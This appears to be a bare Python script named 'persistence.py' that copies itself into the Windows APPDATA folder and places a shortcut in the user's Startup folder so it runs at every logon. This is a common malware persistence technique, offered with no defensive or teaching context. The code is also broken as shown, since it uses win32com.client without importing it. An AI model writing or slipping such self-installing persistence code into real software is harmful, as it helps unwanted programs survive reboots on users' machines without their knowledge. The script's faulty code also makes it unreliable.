import os
import shutil

# Copy the script to the AppData directory
script_name = 'persistence.py'
src_path = os.path.abspath(__file__)
dest_path = os.path.join(os.getenv('APPDATA'), script_name)
shutil.copyfile(src_path, dest_path)

# Create a shortcut in the startup folder
startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
shortcut_name = 'Persistent Script.lnk'
shortcut_path = os.path.join(startup_folder, shortcut_name)

target = dest_path
wDir = os.path.dirname(dest_path)
icon = ''
shell = win32com.client.Dispatch("WScript.Shell")
shortcut = shell.CreateShortCut(shortcut_path)
shortcut.Targetpath = target
shortcut.WorkingDirectory = wDir
shortcut.IconLocation = icon
shortcut.save()
